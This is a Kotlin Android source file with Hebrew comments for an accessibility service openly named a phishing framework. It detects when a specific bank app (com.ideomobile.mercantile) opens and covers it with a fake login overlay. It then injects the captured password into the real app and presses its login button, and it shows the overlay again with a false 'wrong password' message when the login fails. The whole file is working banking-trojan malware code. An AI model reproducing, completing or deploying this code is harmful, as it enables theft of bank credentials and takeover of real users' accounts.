package com.example.phishingframework

import android.accessibilityservice.AccessibilityService
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.content.ContextCompat

class PhishingAccessibilityService : AccessibilityService() {
    companion object {
        private const val TAG = "PhishingService"
        private const val TARGET_PACKAGE = "com.ideomobile.mercantile"
        private const val ACTION_INJECT_PASSWORD = "com.example.phishingframework.ACTION_INJECT_PASSWORD"
    }

    private val handler = Handler(Looper.getMainLooper())

    // משתנה פשוט שמונע הצגה כפולה
    private var overlayShown = false

    // משתנה שמסמן שהמשתמש כבר התחבר
    private var userLoggedIn = false

    // זמן אחרון שהצגנו overlay - למניעת הצגות כפולות
    private var lastOverlayShowTime = 0L

    // מעקב אחרי ניסיון התחברות
    private var loginAttemptTime = 0L

    // לשמירת הסיסמה להזרקה
    private var injectedPassword: String = ""
    private lateinit var injectorReceiver: BroadcastReceiver

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(TAG, "Service Connected")

        // רישום receiver לקבלת סיסמה
        injectorReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                injectedPassword = intent.getStringExtra("password") ?: ""
                Log.i(TAG, "Received password for injection")

                // מסמנים שאנחנו בתהליך התחברות מחדש
                overlayShown = false
                userLoggedIn = true  // מונע הצגת overlay נוסף

                // אחרי קבלת הסיסמה, נזריק אותה אוטומטית
                if (injectedPassword.isNotEmpty()) {
                    handler.postDelayed({
                        injectPasswordToRealApp()
                    }, 1000)  // המתנה ארוכה יותר כדי לתת למסך להיטען
                }
            }
        }

        val filter = IntentFilter(ACTION_INJECT_PASSWORD)
        ContextCompat.registerReceiver(
            this,
            injectorReceiver,
            filter,
            ContextCompat.RECEIVER_NOT_EXPORTED
        )
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        // מסננים רק אירועי שינוי חלון
        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return

        val pkg = event.packageName?.toString() ?: return
        Log.i(TAG, "Window changed to: $pkg")

        // מתעלמים מהאפליקציה שלנו
        if (pkg == packageName) return

        // מתעלמים מ-SystemUI ומקלדות
        val ignoredPackages = setOf(
            "com.android.systemui",
            "com.samsung.android.honeyboard",
            "com.google.android.inputmethod.latin",
            "com.android.inputmethod.latin"
        )
        if (pkg in ignoredPackages) return

        // הלוגיקה הפשוטה:
        when (pkg) {
            TARGET_PACKAGE -> {
                // בדיקה שעברו לפחות 2 שניות מההצגה האחרונה
                val currentTime = System.currentTimeMillis()
                if (currentTime - lastOverlayShowTime < 2000) {
                    Log.i(TAG, "Ignoring duplicate event - too soon")
                    return
                }

                // אם האפליקציה האמיתית נפתחת ועוד לא הצגנו overlay ולא התחברנו
                if (!overlayShown && !userLoggedIn) {
                    overlayShown = true
                    lastOverlayShowTime = currentTime

                    // נוסיף השהייה קטנה כדי לתת למערכת להתייצב
                    handler.postDelayed({
                        showPhishingOverlay()
                    }, 100)
                } else if (userLoggedIn && loginAttemptTime > 0) {
                    // אם ניסינו להתחבר, נבדוק אם נכשלנו
                    if (currentTime - loginAttemptTime > 2000) {
                        checkForLoginFailure()
                    }
                }
            }

            "com.sec.android.app.launcher" -> {
                // חזרה ל-Home - מאפסים את המצב
                overlayShown = false
                userLoggedIn = false
                loginAttemptTime = 0L
                injectedPassword = ""
            }

            else -> {
                // כל אפליקציה אחרת - מאפסים את המצב
                if (pkg != packageName) {
                    overlayShown = false
                    userLoggedIn = false
                    loginAttemptTime = 0L
                }
            }
        }
    }

    private fun showPhishingOverlay() {
        Log.i(TAG, "Showing phishing overlay")

        val intent = Intent(this, PhishingOverlayActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
            addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
            addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
        }
        startActivity(intent)
    }

    private fun showPhishingOverlay(errorMessage: String? = null) {
        Log.i(TAG, "Showing phishing overlay" + if (errorMessage != null) " with error: $errorMessage" else "")

        val intent = Intent(this, PhishingOverlayActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
            addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
            addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)

            // מעבירים הודעת שגיאה אם יש
            errorMessage?.let {
                putExtra("error_message", it)
            }
        }
        startActivity(intent)
    }

    private fun checkForLoginFailure() {
        val root = rootInActiveWindow ?: return

        // בודקים אם עדיין רואים את כפתור הכניסה - סימן שלא התחברנו
        val loginButtons = root.findAccessibilityNodeInfosByViewId(
            "com.ideomobile.mercantile:id/LoginButton"
        )

        if (loginButtons.isNotEmpty()) {
            Log.i(TAG, "Login failed - still on login screen")

            // מאפסים את המצב
            overlayShown = false
            userLoggedIn = false
            loginAttemptTime = 0L

            // מציגים שוב את ה-overlay עם הודעת שגיאה
            handler.postDelayed({
                showPhishingOverlay("הסיסמה שהזנת שגויה, אנא נסה שוב")
            }, 500)
        } else {
            // התחברנו בהצלחה - מאפסים את זמן הניסיון
            loginAttemptTime = 0L
        }
    }

    private fun injectPasswordToRealApp() {
        Log.i(TAG, "Attempting to inject password")

        val root = rootInActiveWindow
        if (root == null) {
            Log.w(TAG, "No root window available")
            return
        }

        // מחפשים את שדה הסיסמה
        val passwordNodes = root.findAccessibilityNodeInfosByViewId(
            "com.ideomobile.mercantile:id/text_input_edit_text_layout"
        )

        if (passwordNodes.isEmpty()) {
            Log.w(TAG, "Password field not found")
            return
        }

        val passwordNode = passwordNodes[0]

        // מוקד על השדה
        passwordNode.performAction(AccessibilityNodeInfo.ACTION_FOCUS)

        // הזנת הסיסמה
        val arguments = android.os.Bundle()
        arguments.putCharSequence(
            AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
            injectedPassword
        )
        passwordNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)

        Log.i(TAG, "Password injected successfully")

        // לחיצה על כפתור הכניסה
        handler.postDelayed({
            val loginButtons = root.findAccessibilityNodeInfosByViewId(
                "com.ideomobile.mercantile:id/LoginButton"
            )
            if (loginButtons.isNotEmpty()) {
                loginButtons[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)
                Log.i(TAG, "Login button clicked")

                // מסמנים שהמשתמש התחבר וזמן הניסיון
                userLoggedIn = true
                loginAttemptTime = System.currentTimeMillis()
            }
        }, 300)

        // איפוס המצב לאחר ההזרקה
        overlayShown = false
        injectedPassword = ""
    }

    override fun onInterrupt() {
        Log.i(TAG, "Service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(injectorReceiver)
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering receiver", e)
        }
    }
}